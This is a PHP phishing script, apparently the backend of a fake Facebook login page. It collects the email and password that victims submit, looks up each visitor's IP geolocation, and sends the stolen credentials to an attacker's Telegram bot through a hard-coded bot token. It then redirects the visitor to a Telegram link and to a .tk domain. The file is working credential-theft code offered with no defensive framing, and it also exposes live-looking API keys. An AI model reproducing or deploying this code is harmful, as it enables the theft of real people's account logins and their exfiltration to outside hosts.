<?php
header ('Location: https://t.me/joinchat/WojntzcYhB04YzMy');
$API_KEY = "1725475206:AAHcUm6h3mrOhHfGK6a7gBriDWNWuKI4KmY";
?>
<?php
$ip = $_SERVER[ REMOTE_ADDR ]; 
$details = json_decode(file_get_contents("http://api.ipapi.com/".$ip."?access_key=b36d8a28ce8891c963d4a9503e95a379"));
$country_name = $details->country_name;
$country_code = $details->country_code;
$city = $details->city;
$region_name = $details->region_name;
$calling_code = $details->location->calling_code;
$ip = $details->ip;
 ?>
<?php
 $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
 $api = json_decode(file_get_contents("https://ipinfo.io/$ip"));
 $city = $api->city;
$admin = 484275579; 
$user = $_POST["medo"];
$pass = $_POST["MEDO"];
$login = $_POST["login"];
$tier = $_POST["tier"];
$phone = $_POST['phone'];
$text = urlencode("
💫 - 𝗻𝗲𝘄 𝗹𝗼𝗴𝗶𝗻 𝗯𝘆 -  𖦹𝙸𝙽𝙳𝙴𝚇 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𖦹
━━━━━━━━━━━━
ᯓ ᴇᴍᴀɪʟ 𓂅 `$user`


ᯓ ᴘᴀssᴡᴏʀᴅ 𓂅 `$pass`


━━━━━━━━━━━━
🇮🇶🔥 - ʙʏ :- @SS0OOS 
");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
<html>
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159654279-2"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag("js", new Date());
gtag("config", "UA-159654279-2");
</script>
<meta http-equiv="Refresh" content="0; url=m-facsebook-sexsy-iraq-xno.tk/com" />
</head>
<body>
</body>
</html>